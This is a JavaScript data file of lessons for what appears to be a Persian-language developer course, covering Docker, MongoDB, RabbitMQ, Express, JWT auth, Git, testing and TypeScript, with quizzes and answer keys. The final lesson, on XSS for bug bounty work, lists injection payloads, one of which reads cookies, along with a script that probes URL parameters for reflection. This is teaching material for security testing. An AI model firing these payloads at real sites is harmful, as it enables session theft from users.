        icon: "🔌",
        steps: [
            { type: "teach", title: "Volumes", content: `<p>Volume برای ذخیره دائمی داده (حتی بعد حذف container):</p><pre><code># Named volume
docker run -v mydata:/data mongo

# Bind mount (فایل لوکال)
docker run -v ./src:/app/src node

# در docker-compose
volumes:
  - mongo-data:/data/db    # named volume
  - ./config:/app/config   # bind mount
  - /app/node_modules      # anonymous volume</code></pre>` },
            { type: "quiz", title: "بدون volume، داده‌ها بعد حذف container چی میشن؟", options: ["می‌مونن", "پاک میشن", "به host منتقل میشن", "بستگی داره"], correct: 1 },
            { type: "teach", title: "Networking", content: `<pre><code># containerها توی یه network همدیگه رو با اسم پیدا می‌کنن
docker network create mynet
docker run --network mynet --name db mongo
docker run --network mynet --name app myapp
# app می‌تونه با "db:27017" وصل بشه

# در compose خودکار network ساخته میشه
# service ها با اسمشون قابل دسترسین:
mongoose.connect("mongodb://db:27017/mydb")</code></pre>` },
            { type: "quiz", title: "در compose، چطور به سرویس db وصل میشیم؟", options: ["localhost:27017", "db:27017", "127.0.0.1:27017", "container_id:27017"], correct: 1 },
            { type: "code", title: "Volume تعریف کن!", instruction: "یه volume برای MongoDB بنویس که data رو ذخیره کنه.", answer: 'volumes:\n  - mongo-data:/data/db', validate: function(code) { return code.includes('mongo') && code.includes('/data'); } }
        ]
    },
    {
        id: 26,
        title: "MongoDB مقدماتی",
        icon: "🍃",
        steps: [
            { type: "teach", title: "MongoDB چیست؟", content: `<p>MongoDB یه دیتابیس NoSQL ه که داده رو به صورت document (JSON) ذخیره می‌کنه:</p><pre><code>// ساختار: Database → Collection → Document
// مثل: MySQL → Table → Row

// یه document:
{
    "_id": ObjectId("..."),
    "name": "علی",
    "age": 25,
    "hobbies": ["کدنویسی", "بازی"],
    "address": { "city": "تهران" }
}

// اجرا با Docker
docker run -d -p 27017:27017 --name mongo mongo:7</code></pre>` },
            { type: "quiz", title: "MongoDB داده رو به چه فرمتی ذخیره می‌کنه؟", options: ["Table/Row", "JSON/BSON Document", "Key-Value", "Graph"], correct: 1 },
            { type: "teach", title: "CRUD Operations", content: `<pre><code>// اتصال با Node.js (mongoose)
const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost:27017/mydb');

// Schema
const userSchema = new mongoose.Schema({
    name: String,
    age: Number,
    email: { type: String, unique: true }
});
const User = mongoose.model('User', userSchema);

// Create
await User.create({ name: "علی", age: 25 });

// Read
await User.find({ age: { $gt: 20 } });
await User.findOne({ name: "علی" });

// Update
await User.updateOne({ name: "علی" }, { age: 26 });

// Delete
await User.deleteOne({ name: "علی" });</code></pre>` },
            { type: "quiz", title: "find({ age: { $gt: 20 } }) یعنی چی؟", options: ["age = 20", "age > 20", "age < 20", "age >= 20"], correct: 1 },
            { type: "code", title: "Query بنویس!", instruction: "یه query بنویس که همه userهایی که age بزرگتر از 18 هست رو پیدا کنه.", answer: 'await User.find({ age: { $gt: 18 } });', validate: function(code) { return code.includes('find') && code.includes('$gt'); } }
        ]
    },
    {
        id: 27,
        title: "MongoDB پیشرفته",
        icon: "🌿",
        steps: [
            { type: "teach", title: "Aggregation Pipeline", content: `<pre><code>// Pipeline: مراحل پردازش داده
await User.aggregate([
    { $match: { age: { $gte: 18 } } },
    { $group: {
        _id: "$city",
        count: { $sum: 1 },
        avgAge: { $avg: "$age" }
    }},
    { $sort: { count: -1 } },
    { $limit: 10 }
]);

// Lookup (مثل JOIN)
{ $lookup: {
    from: "orders",
    localField: "_id",
    foreignField: "userId",
    as: "userOrders"
}}</code></pre>` },
            { type: "quiz", title: "$group چیکار می‌کنه؟", options: ["فیلتر می‌کنه", "مرتب می‌کنه", "گروه‌بندی و محاسبه", "حذف می‌کنه"], correct: 2 },
            { type: "teach", title: "Indexing و Performance", content: `<pre><code>// ساخت index (سرعت query)
userSchema.index({ email: 1 });        // ascending
userSchema.index({ name: 1, age: -1 }); // compound
userSchema.index({ location: '2dsphere' }); // geo

// Populate (مثل JOIN)
const orderSchema = new mongoose.Schema({
    user: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    total: Number
});

await Order.find().populate('user');

// Pagination
await User.find()
    .skip(20)
    .limit(10)
    .sort({ createdAt: -1 });</code></pre>` },
            { type: "quiz", title: "Index چرا مهمه؟", options: ["داده رو حذف می‌کنه", "query رو سریع‌تر می‌کنه", "backup می‌گیره", "فضا آزاد می‌کنه"], correct: 1 },
            { type: "code", title: "Aggregation بنویس!", instruction: "یه pipeline بنویس که userها رو بر اساس city گروه‌بندی کنه.", answer: 'User.aggregate([{ $group: { _id: "$city", count: { $sum: 1 } } }])', validate: function(code) { return code.includes('aggregate') && code.includes('$group'); } }
        ]
    },
    {
        id: 28,
        title: "RabbitMQ مقدماتی",
        icon: "🐰",
        steps: [
            { type: "teach", title: "RabbitMQ چیست؟", content: `<p>RabbitMQ یه Message Broker ه - پیام‌ها رو بین سرویس‌ها منتقل می‌کنه:</p><pre><code>// مفاهیم:
// Producer: فرستنده پیام
// Consumer: گیرنده پیام
// Queue: صف پیام‌ها
// Exchange: مسیریاب پیام‌ها

// اجرا با Docker
docker run -d --name rabbitmq \\
    -p 5672:5672 \\
    -p 15672:15672 \\
    rabbitmq:3-management

// پنل مدیریت: http://localhost:15672
// user: guest / pass: guest</code></pre>` },
            { type: "quiz", title: "RabbitMQ چه کاری انجام میده؟", options: ["ذخیره داده", "انتقال پیام بین سرویس‌ها", "مدیریت container", "load balancing"], correct: 1 },
            { type: "teach", title: "Producer و Consumer", content: `<pre><code>// نصب: npm install amqplib
const amqp = require('amqplib');

// Producer (فرستنده)
async function send(msg) {
    const conn = await amqp.connect('amqp://localhost');
    const ch = await conn.createChannel();
    await ch.assertQueue('tasks');
    ch.sendToQueue('tasks', Buffer.from(JSON.stringify(msg)));
    console.log("ارسال شد:", msg);
}

// Consumer (گیرنده)
async function receive() {
    const conn = await amqp.connect('amqp://localhost');
    const ch = await conn.createChannel();
    await ch.assertQueue('tasks');
    ch.consume('tasks', (msg) => {
        const data = JSON.parse(msg.content.toString());
        console.log("دریافت:", data);
        ch.ack(msg); // تایید پردازش
    });
}</code></pre>` },
            { type: "quiz", title: "ch.ack(msg) چیکار می‌کنه؟", options: ["پیام رو ارسال می‌کنه", "تایید پردازش موفق", "پیام رو حذف می‌کنه", "صف رو خالی می‌کنه"], correct: 1 },
            { type: "code", title: "Producer بنویس!", instruction: "کدی بنویس که به queue به اسم 'emails' یه پیام بفرسته.", answer: "ch.sendToQueue('emails', Buffer.from(msg));", validate: function(code) { return code.includes('sendToQueue') && code.includes('emails'); } }
        ]
    },
    {
        id: 29,
        title: "RabbitMQ پیشرفته",
        icon: "🐇",
        steps: [
            { type: "teach", title: "Exchange Types", content: `<p>Exchange تعیین می‌کنه پیام به کدوم queue بره:</p><pre><code>// Direct: routing key دقیق
await ch.assertExchange('logs', 'direct');
ch.publish('logs', 'error', Buffer.from(msg));
// فقط queue هایی که به 'error' bind شدن می‌گیرن

// Fanout: به همه queue ها
await ch.assertExchange('news', 'fanout');
ch.publish('news', '', Buffer.from(msg));
// همه subscriber ها می‌گیرن

// Topic: pattern matching
await ch.assertExchange('events', 'topic');
ch.publish('events', 'user.created', Buffer.from(msg));
// queue با pattern 'user.*' می‌گیره</code></pre>` },
            { type: "quiz", title: "Fanout exchange چطور کار می‌کنه؟", options: ["به یه queue", "به همه queue ها", "بر اساس routing key", "تصادفی"], correct: 1 },
            { type: "teach", title: "الگوهای کاربردی", content: `<pre><code>// Work Queue (توزیع کار بین workerها)
ch.prefetch(1); // هر worker فقط 1 پیام بگیره

// Dead Letter Queue (پیام‌های fail شده)
await ch.assertQueue('tasks', {
    deadLetterExchange: 'dlx',
    messageTtl: 60000 // 1 دقیقه timeout
});

// RPC Pattern (درخواست-پاسخ)
const correlationId = generateId();
ch.sendToQueue('rpc_queue', Buffer.from(msg), {
    replyTo: callbackQueue,
    correlationId: correlationId
});</code></pre>` },
            { type: "quiz", title: "prefetch(1) چیکار می‌کنه؟", options: ["1 پیام ارسال می‌کنه", "هر consumer فقط 1 پیام همزمان بگیره", "صف رو 1 ثانیه قفل می‌کنه", "1 consumer فعال باشه"], correct: 1 },
            { type: "code", title: "Exchange بساز!", instruction: "یه fanout exchange به اسم 'notifications' بساز و پیام publish کن.", answer: "ch.assertExchange('notifications', 'fanout'); ch.publish('notifications', '', Buffer.from(msg));", validate: function(code) { return code.includes('assertExchange') && code.includes('fanout'); } }
        ]
    },
    {
        id: 30,
        title: "پروژه نهایی",
        icon: "🚀",
        steps: [
            { type: "teach", title: "معماری Microservice", content: `<p>ترکیب همه چیزایی که یاد گرفتی:</p><pre><code>// docker-compose.yml - پروژه کامل
version: '3.8'
services:
  api:
    build: ./api
    ports: ["3000:3000"]
    depends_on: [mongo, rabbitmq]
    environment:
      - MONGO_URL=mongodb://mongo:27017/app
      - RABBIT_URL=amqp://rabbitmq

  worker:
    build: ./worker
    depends_on: [rabbitmq, mongo]

  mongo:
    image: mongo:7
    volumes: [mongo-data:/data/db]

  rabbitmq:
    image: rabbitmq:3-management
    ports: ["5672:5672", "15672:15672"]

volumes:
  mongo-data:</code></pre>` },
            { type: "quiz", title: "چرا از RabbitMQ بین سرویس‌ها استفاده می‌کنیم؟", options: ["سریع‌تره از HTTP", "async و fault-tolerant", "رایگانه", "فقط مد شده"], correct: 1 },
            { type: "teach", title: "API + Worker Pattern", content: `<pre><code>// api/server.js - دریافت درخواست
app.post('/orders', async (req, res) => {
    const order = await Order.create(req.body);
    
    // ارسال به worker برای پردازش
    ch.sendToQueue('process-order',
        Buffer.from(JSON.stringify(order))
    );
    
    res.json({ status: 'processing', id: order._id });
});

// worker/index.js - پردازش در background
ch.consume('process-order', async (msg) => {
    const order = JSON.parse(msg.content.toString());
    
    await processPayment(order);
    await sendEmail(order.userEmail);
    await Order.updateOne(
        { _id: order._id },
        { status: 'completed' }
    );
    
    ch.ack(msg);
});</code></pre>` },
            { type: "quiz", title: "چرا پردازش سفارش رو به worker می‌دیم؟", options: ["امنیت بیشتر", "API سریع جواب بده و کار سنگین background بره", "worker ارزون‌تره", "فقط یه روش طراحیه"], correct: 1 },
            { type: "code", title: "Compose بنویس!", instruction: "یه docker-compose بنویس با سرویس‌های <code>api</code> و <code>mongo</code>.", answer: 'services:\n  api:\n    build: .\n    ports: ["3000:3000"]\n  mongo:\n    image: mongo:7', validate: function(code) { return code.includes('api') && code.includes('mongo'); } }
        ]
    },
    {
        id: 31,
        title: "Node.js و Express",
        icon: "🟢",
        steps: [
            { type: "teach", title: "Express.js", content: `<p>Express محبوب‌ترین فریمورک وب Node.js ه:</p><pre><code>const express = require('express');
const app = express();

app.use(express.json()); // parse JSON body

app.get('/api/users', (req, res) => {
    res.json([{ name: "علی" }]);
});

app.post('/api/users', (req, res) => {
    const { name, email } = req.body;
    // ذخیره در دیتابیس...
    res.status(201).json({ name, email });
});

app.listen(3000, () => console.log("Server on :3000"));</code></pre>` },
            { type: "quiz", title: "app.use(express.json()) چیکار می‌کنه؟", options: ["JSON فایل می‌سازه", "body درخواست رو parse می‌کنه", "response رو JSON می‌کنه", "خطا هندل می‌کنه"], correct: 1 },
            { type: "teach", title: "Middleware و Router", content: `<pre><code>// Middleware: تابعی که قبل route اجرا میشه
const auth = (req, res, next) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: "Unauthorized" });
    req.user = verifyToken(token);
    next(); // برو مرحله بعد
};

app.get('/api/profile', auth, (req, res) => {
    res.json(req.user);
});

// Router: تقسیم routeها
const userRouter = express.Router();
userRouter.get('/', getUsers);
userRouter.post('/', createUser);
userRouter.get('/:id', getUserById);
app.use('/api/users', userRouter);</code></pre>` },
            { type: "quiz", title: "next() در middleware چیکار می‌کنه؟", options: ["response می‌فرسته", "به middleware/route بعدی میره", "سرور رو ری‌استارت می‌کنه", "خطا میده"], correct: 1 },
            { type: "code", title: "Route بنویس!", instruction: "یه GET route برای <code>/api/products</code> بنویس که لیست محصولات رو برگردونه.", answer: 'app.get("/api/products", (req, res) => { res.json(products); });', validate: function(code) { return code.includes('app.get') && code.includes('/api/products') && code.includes('res.json'); } }
        ]
    },
    {
        id: 32,
        title: "REST API Design",
        icon: "📡",
        steps: [
            { type: "teach", title: "اصول REST", content: `<p>REST یه استاندارد طراحی API ه:</p><pre><code>// HTTP Methods:
GET    /api/users      → لیست همه
GET    /api/users/:id  → یه کاربر
POST   /api/users      → ساخت کاربر
PUT    /api/users/:id  → آپدیت کامل
PATCH  /api/users/:id  → آپدیت جزئی
DELETE /api/users/:id  → حذف

// Status Codes:
200 OK
201 Created
400 Bad Request
401 Unauthorized
403 Forbidden
404 Not Found
500 Internal Server Error</code></pre>` },
            { type: "quiz", title: "برای ساخت resource جدید کدوم method؟", options: ["GET", "POST", "PUT", "PATCH"], correct: 1 },
            { type: "teach", title: "Validation و Error Handling", content: `<pre><code>// Input validation
const Joi = require('joi');

const userSchema = Joi.object({
    name: Joi.string().min(2).required(),
    email: Joi.string().email().required(),
    age: Joi.number().min(18)
});

app.post('/api/users', (req, res) => {
    const { error } = userSchema.validate(req.body);
    if (error) return res.status(400).json({
        error: error.details[0].message
    });
    // ادامه...
});

// Global error handler
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: "Internal Server Error" });
});</code></pre>` },
            { type: "quiz", title: "status 400 یعنی چی؟", options: ["سرور خراب", "درخواست نامعتبر", "پیدا نشد", "دسترسی ندارید"], correct: 1 },
            { type: "code", title: "Validation بنویس!", instruction: "یه middleware بنویس که چک کنه body حتماً <code>name</code> داشته باشه.", answer: 'const validate = (req, res, next) => { if (!req.body.name) return res.status(400).json({error: "name required"}); next(); };', validate: function(code) { return code.includes('req.body') && code.includes('400') && code.includes('next'); } }
        ]
    },
    {
        id: 33,
        title: "Authentication",
        icon: "🔐",
        steps: [
            { type: "teach", title: "JWT Authentication", content: `<pre><code>const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// ثبت‌نام
app.post('/api/register', async (req, res) => {
    const hashedPassword = await bcrypt.hash(req.body.password, 10);
    const user = await User.create({
        email: req.body.email,
        password: hashedPassword
    });
    res.status(201).json({ message: "ثبت‌نام شد" });
});

// ورود
app.post('/api/login', async (req, res) => {
    const user = await User.findOne({ email: req.body.email });
    if (!user) return res.status(401).json({ error: "ایمیل اشتباه" });
    
    const valid = await bcrypt.compare(req.body.password, user.password);
    if (!valid) return res.status(401).json({ error: "رمز اشتباه" });
    
    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
        expiresIn: '7d'
    });
    res.json({ token });
});</code></pre>` },
            { type: "quiz", title: "چرا password رو hash می‌کنیم؟", options: ["سریع‌تر بشه", "اگه DB هک شد رمز لو نره", "فضای کمتر بگیره", "الزامی نیست"], correct: 1 },
            { type: "teach", title: "Auth Middleware", content: `<pre><code>const authMiddleware = (req, res, next) => {
    const header = req.headers.authorization;
    if (!header) return res.status(401).json({ error: "توکن نداری" });
    
    const token = header.split(' ')[1]; // "Bearer TOKEN"
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.userId = decoded.id;
        next();
    } catch (err) {
        res.status(401).json({ error: "توکن نامعتبر" });
    }
};

// استفاده
app.get('/api/profile', authMiddleware, async (req, res) => {
    const user = await User.findById(req.userId);
    res.json(user);
});</code></pre>` },
            { type: "quiz", title: "JWT توکن کجا فرستاده میشه؟", options: ["body", "Authorization header", "URL parameter", "cookie فقط"], correct: 1 },
            { type: "code", title: "Auth middleware بنویس!", instruction: "یه middleware بنویس که توکن رو از header بخونه و verify کنه.", answer: 'const auth = (req, res, next) => { const token = req.headers.authorization; jwt.verify(token, secret); next(); };', validate: function(code) { return code.includes('authorization') && code.includes('verify') && code.includes('next'); } }
        ]
    },
    {
        id: 34,
        title: "Git مقدماتی",
        icon: "📝",
        steps: [
            { type: "teach", title: "Git چیست؟", content: `<p>Git سیستم version control ه - تاریخچه تغییرات کدت رو نگه می‌داره:</p><pre><code># شروع پروژه
git init
git clone https://github.com/user/repo.git

# گردش کار روزانه
git status              # وضعیت فایل‌ها
git add .               # اضافه به staging
git commit -m "feat: add login"  # ثبت تغییرات
git push origin main    # ارسال به remote

# دیدن تاریخچه
git log --oneline
git diff                # تغییرات فعلی</code></pre>` },
            { type: "quiz", title: "git add چیکار می‌کنه؟", options: ["فایل جدید می‌سازه", "تغییرات رو به staging اضافه می‌کنه", "commit می‌کنه", "push می‌کنه"], correct: 1 },
            { type: "teach", title: "Branch و Merge", content: `<pre><code># ساخت branch
git branch feature/login
git checkout feature/login
# یا یکجا:
git checkout -b feature/login

# کار روی branch
git add .
git commit -m "feat: login page"

# برگشت به main و merge
git checkout main
git merge feature/login

# حل conflict
<<<<<<< HEAD
کد شما
=======
کد دیگران
>>>>>>> feature/login</code></pre>` },
            { type: "quiz", title: "چرا از branch استفاده می‌کنیم؟", options: ["سریع‌تره", "کار موازی بدون خراب کردن main", "اجباریه", "فقط تیمی"], correct: 1 },
            { type: "code", title: "Git command بنویس!", instruction: "دستوراتی بنویس که یه branch جدید بسازه و بره روش.", answer: 'git checkout -b feature/new', validate: function(code) { return code.includes('checkout') && code.includes('-b'); } }
        ]
    },
    {
        id: 35,
        title: "Testing",
        icon: "🧪",
        steps: [
            { type: "teach", title: "Unit Testing با Jest", content: `<pre><code>// math.js
function add(a, b) { return a + b; }
module.exports = { add };

// math.test.js
const { add } = require('./math');

describe('add function', () => {
    test('adds two numbers', () => {
        expect(add(2, 3)).toBe(5);
    });
    
    test('handles negative numbers', () => {
        expect(add(-1, 1)).toBe(0);
    });
    
    test('handles zero', () => {
        expect(add(0, 0)).toBe(0);
    });
});

// اجرا: npx jest</code></pre>` },
            { type: "quiz", title: "expect(x).toBe(y) چیکار می‌کنه؟", options: ["x رو برابر y می‌کنه", "چک می‌کنه x برابر y هست", "x رو به y تبدیل می‌کنه", "y رو return می‌کنه"], correct: 1 },
            { type: "teach", title: "API Testing", content: `<pre><code>const request = require('supertest');
const app = require('./app');

describe('Users API', () => {
    test('GET /api/users returns list', async () => {
        const res = await request(app)
            .get('/api/users')
            .expect(200);
        
        expect(res.body).toBeInstanceOf(Array);
    });
    
    test('POST /api/users creates user', async () => {
        const res = await request(app)
            .post('/api/users')
            .send({ name: "علی", email: "ali@test.com" })
            .expect(201);
        
        expect(res.body.name).toBe("علی");
    });
});</code></pre>` },
            { type: "quiz", title: "چرا تست می‌نویسیم؟", options: ["اجباریه", "باگ رو زودتر پیدا کنیم و refactor راحت‌تر باشه", "سرعت اجرا بیشتر بشه", "فقط برای CI/CD"], correct: 1 },
            { type: "code", title: "تست بنویس!", instruction: "یه تست بنویس که چک کنه تابع <code>multiply(3,4)</code> برابر 12 هست.", answer: 'test("multiply", () => { expect(multiply(3,4)).toBe(12); });', validate: function(code) { return code.includes('expect') && code.includes('toBe') && code.includes('12'); } }
        ]
    },
    {
        id: 36,
        title: "TypeScript مقدماتی",
        icon: "🔷",
        steps: [
            { type: "teach", title: "TypeScript چیست؟", content: `<p>TypeScript = JavaScript + Type System. خطاها رو قبل اجرا پیدا می‌کنه:</p><pre><code>// تایپ متغیر
let name: string = "علی";
let age: number = 25;
let active: boolean = true;
let items: string[] = ["a", "b"];

// تایپ تابع
function add(a: number, b: number): number {
    return a + b;
}

// Interface
interface User {
    name: string;
    age: number;
    email?: string; // optional
}

const user: User = { name: "علی", age: 25 };</code></pre>` },
            { type: "quiz", title: "TypeScript کی خطا میده؟", options: ["زمان اجرا", "زمان compile (قبل اجرا)", "هیچوقت", "فقط production"], correct: 1 },
            { type: "teach", title: "Type های پیشرفته", content: `<pre><code>// Union type
let id: string | number = "abc";
id = 123; // OK

// Generic
function first<T>(arr: T[]): T {
    return arr[0];
}
first<number>([1,2,3]); // 1

// Enum
enum Status {
    Pending = "PENDING",
    Active = "ACTIVE",
    Done = "DONE"
}

// Type assertion
const input = document.getElementById("name") as HTMLInputElement;
input.value;</code></pre>` },
            { type: "quiz", title: "Generic <T> چیه؟", options: ["یه تایپ ثابت", "تایپ متغیر که موقع استفاده مشخص میشه", "خطا", "فقط برای class"], correct: 1 },
            { type: "code", title: "Interface بنویس!", instruction: "یه interface <code>Product</code> بنویس با name (string) و price (number).", answer: 'interface Product { name: string; price: number; }', validate: function(code) { return code.includes('interface') && code.includes('Product') && code.includes('string') && code.includes('number'); } }
        ]
    },
    {
        id: 37,
        title: "CI/CD و Deploy",
        icon: "🚀",
        steps: [
            { type: "teach", title: "CI/CD چیست؟", content: `<p>CI/CD خودکارسازی تست و deploy ه:</p><pre><code># .github/workflows/deploy.yml
name: Deploy
on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 18
      - run: npm install
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp .
      - run: docker push registry/myapp</code></pre>` },
            { type: "quiz", title: "CI/CD چه مزیتی داره؟", options: ["کد سریع‌تر اجرا میشه", "تست و deploy خودکار، خطای انسانی کمتر", "رایگانه", "فقط برای تیم بزرگ"], correct: 1 },
            { type: "teach", title: "Environment Variables", content: `<pre><code>// .env (هرگز commit نکن!)
DB_URL=mongodb://localhost:27017/app
JWT_SECRET=my-super-secret
PORT=3000

// استفاده در کد
require('dotenv').config();
const dbUrl = process.env.DB_URL;

// docker-compose
services:
  app:
    environment:
      - NODE_ENV=production
      - DB_URL=mongodb://db:27017/app
    env_file:
      - .env

// .gitignore
.env
node_modules/</code></pre>` },
            { type: "quiz", title: "فایل .env رو باید commit کنیم؟", options: ["بله", "خیر، هرگز!", "فقط production", "بستگی داره"], correct: 1 },
            { type: "code", title: "env استفاده کن!", instruction: "از <code>process.env</code> مقدار <code>PORT</code> رو بخون و اگه نبود 3000 بذار.", answer: 'const port = process.env.PORT || 3000;', validate: function(code) { return code.includes('process.env') && code.includes('PORT') && code.includes('3000'); } }
        ]
    },
    {
        id: 38,
        title: "Design Patterns",
        icon: "🏛️",
        steps: [
            { type: "teach", title: "الگوهای رایج", content: `<pre><code>// Singleton: فقط یه instance
class Database {
    static instance = null;
    static getInstance() {
        if (!Database.instance) {
            Database.instance = new Database();
        }
        return Database.instance;
    }
}

// Observer: اطلاع‌رسانی تغییرات
class EventEmitter {
    constructor() { this.events = {}; }
    on(event, fn) {
        this.events[event] = this.events[event] || [];
        this.events[event].push(fn);
    }
    emit(event, data) {
        (this.events[event] || []).forEach(fn => fn(data));
    }
}

const emitter = new EventEmitter();
emitter.on('userCreated', user => sendEmail(user));
emitter.emit('userCreated', { name: "علی" });</code></pre>` },
            { type: "quiz", title: "Singleton pattern چیه؟", options: ["چند instance", "فقط یه instance از class", "بدون class", "فقط برای DB"], correct: 1 },
            { type: "teach", title: "Factory و Repository", content: `<pre><code>// Factory: ساخت object بدون new مستقیم
function createUser(type) {
    switch(type) {
        case 'admin': return new Admin();
        case 'user': return new RegularUser();
        default: throw new Error("Unknown type");
    }
}

// Repository: جدا کردن logic از دیتابیس
class UserRepository {
    async findById(id) {
        return await User.findById(id);
    }
    async create(data) {
        return await User.create(data);
    }
    async update(id, data) {
        return await User.findByIdAndUpdate(id, data, { new: true });
    }
}

// استفاده در service
class UserService {
    constructor(userRepo) { this.userRepo = userRepo; }
    async getUser(id) { return this.userRepo.findById(id); }
}</code></pre>` },
            { type: "quiz", title: "Repository pattern چه مزیتی داره؟", options: ["سریع‌تره", "logic از DB جدا میشه، تست راحت‌تره", "کد کمتر", "فقط برای MongoDB"], correct: 1 },
            { type: "code", title: "Factory بنویس!", instruction: "یه factory function بنویس که بر اساس type، آبجکت مناسب برگردونه.", answer: 'function createShape(type) { if (type === "circle") return new Circle(); }', validate: function(code) { return code.includes('function') && code.includes('return') && code.includes('new'); } }
        ]
    },
    {
        id: 39,
        title: "پروژه: REST API کامل",
        icon: "💼",
        steps: [
            { type: "teach", title: "ساختار پروژه", content: `<pre><code>project/
├── src/
│   ├── config/
│   │   └── db.js
│   ├── models/
│   │   └── User.js
│   ├── routes/
│   │   └── userRoutes.js
│   ├── controllers/
│   │   └── userController.js
│   ├── middleware/
│   │   ├── auth.js
│   │   └── validate.js
│   ├── services/
│   │   └── userService.js
│   └── app.js
├── tests/
├── .env
├── .gitignore
├── Dockerfile
├── docker-compose.yml
└── package.json</code></pre><p>این ساختار MVC + Service Layer ه. هر لایه یه مسئولیت داره.</p>` },
            { type: "quiz", title: "Controller چه کاری انجام میده؟", options: ["اتصال به DB", "دریافت request و ارسال response", "business logic", "validation"], correct: 1 },
            { type: "teach", title: "پیاده‌سازی لایه‌ها", content: `<pre><code>// models/User.js
const userSchema = new mongoose.Schema({
    name: { type: String, required: true },
    email: { type: String, unique: true, required: true },
    password: { type: String, required: true }
}, { timestamps: true });

// controllers/userController.js
exports.getUsers = async (req, res, next) => {
    try {
        const { page = 1, limit = 10 } = req.query;
        const users = await User.find()
            .skip((page - 1) * limit)
            .limit(limit)
            .select('-password');
        const total = await User.countDocuments();
        res.json({ users, total, page, pages: Math.ceil(total/limit) });
    } catch (err) { next(err); }
};

// routes/userRoutes.js
router.get('/', getUsers);
router.get('/:id', getUserById);
router.post('/', validate(userSchema), createUser);
router.put('/:id', auth, updateUser);
router.delete('/:id', auth, deleteUser);</code></pre>` },
            { type: "quiz", title: "چرا password رو select('-password') می‌کنیم؟", options: ["سریع‌تر بشه", "password در response نباشه", "حذف از DB", "الزامی نیست"], correct: 1 },
            { type: "code", title: "Controller بنویس!", instruction: "یه controller بنویس که یه user رو با id پیدا کنه و برگردونه.", answer: 'exports.getUserById = async (req, res) => { const user = await User.findById(req.params.id); res.json(user); };', validate: function(code) { return code.includes('findById') && code.includes('req.params') && code.includes('res.json'); } }
        ]
    },
    {
        id: 40,
        title: "مصاحبه و بازار کار",
        icon: "🎯",
        steps: [
            { type: "teach", title: "سوالات رایج مصاحبه", content: `<p>موضوعاتی که باید بلد باشی:</p><pre><code>// 1. Hoisting
console.log(x); // undefined (var hoisted)
var x = 5;
console.log(y); // ReferenceError (let not hoisted)
let y = 5;

// 2. Event delegation
document.getElementById('list').addEventListener('click', (e) => {
    if (e.target.tagName === 'LI') {
        console.log(e.target.textContent);
    }
});

// 3. Debounce
function debounce(fn, delay) {
    let timer;
    return function(...args) {
        clearTimeout(timer);
        timer = setTimeout(() => fn(...args), delay);
    };
}

// 4. Deep clone
const clone = JSON.parse(JSON.stringify(obj));
// یا structuredClone(obj)</code></pre>` },
            { type: "quiz", title: "Debounce چیکار می‌کنه؟", options: ["تابع رو سریع‌تر اجرا می‌کنه", "اجرا رو تا پایان تایپ عقب میندازه", "تابع رو حذف می‌کنه", "loop می‌سازه"], correct: 1 },
            { type: "teach", title: "نکات بازار کار", content: `<p>برای ورود به بازار کار:</p><pre><code>// پورتفولیو: 2-3 پروژه واقعی
// 1. REST API با auth + CRUD + Docker
// 2. یه پروژه با RabbitMQ (مثل notification system)
// 3. یه پروژه فرانت (React/Vue)

// مهارت‌های لازم:
// ✓ JavaScript/TypeScript
// ✓ Node.js + Express
// ✓ MongoDB/PostgreSQL
// ✓ Docker + Docker Compose
// ✓ Git + GitHub
// ✓ REST API design
// ✓ Authentication (JWT)
// ✓ Testing basics
// ✓ Linux basics

// نکات رزومه:
// - GitHub فعال با commit منظم
// - README خوب برای پروژه‌ها
// - Clean code و ساختار مناسب</code></pre>` },
            { type: "quiz", title: "مهم‌ترین چیز برای ورود به بازار کار؟", options: ["مدرک دانشگاه", "پروژه‌های واقعی و GitHub فعال", "حفظ کردن syntax", "فقط فرانت‌اند"], correct: 1 },
            { type: "code", title: "Debounce بنویس!", instruction: "یه تابع <code>debounce</code> بنویس که تابع و delay بگیره.", answer: 'function debounce(fn, delay) { let timer; return (...args) => { clearTimeout(timer); timer = setTimeout(() => fn(...args), delay); }; }', validate: function(code) { return code.includes('debounce') && code.includes('setTimeout') && code.includes('clearTimeout'); } }
        ]
    },
    {
        id: 41,
        title: "باگ‌بانتی: XSS",
        icon: "💉",
        steps: [
            { type: "teach", title: "XSS چیست؟", content: `<p>Cross-Site Scripting: تزریق کد JS مخرب به صفحه وب:</p><pre><code>// Reflected XSS - ورودی مستقیم در صفحه
// URL: site.com/search?q=<script>alert(1)</script>

// Stored XSS - ذخیره در دیتابیس
// مثلاً در فیلد نام: <img src=x onerror=alert(1)>

// DOM-based XSS - تغییر DOM با JS
document.getElementById('output').innerHTML = location.hash;
// URL: site.com/#<img src=x onerror=alert(document.cookie)>

// تست ساده XSS:
// 1. هر جا ورودی کاربر نمایش داده میشه تست کن
// 2. Payloadهای رایج:
'<script>alert(1)</script>'
'<img src=x onerror=alert(1)>'
'" onmouseover="alert(1)"'
"javascript:alert(1)"</code></pre>` },
            { type: "quiz", title: "XSS چه نوع حمله‌ایه؟", options: ["تزریق SQL", "تزریق JavaScript در مرورگر قربانی", "حمله به سرور", "brute force"], correct: 1 },
            { type: "teach", title: "پیدا کردن XSS", content: `<pre><code>// اسکریپت تست XSS با fetch
// بررسی reflection در response
async function testXSS(url, param) {
    const payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '{{7*7}}',  // template injection
        '${7*7}',
    ];
    
    for (const payload of payloads) {
        const testUrl = url + '?' + param + '=' + encodeURIComponent(payload);
        const res = await fetch(testUrl);
        const body = await res.text();
        
        if (body.includes(payload)) {
            console.log('[!] Reflected:', payload);
        }
    }
}

// بررسی DOM XSS
// منابع خطرناک (Sources):
// location.hash, location.search, document.referrer
// window.name, postMessage

// مقاصد خطرناک (Sinks):
// innerHTML, outerHTML, document.write
// eval(), setTimeout(string), setInterval(string)
// location.href, window.open</code></pre>` },
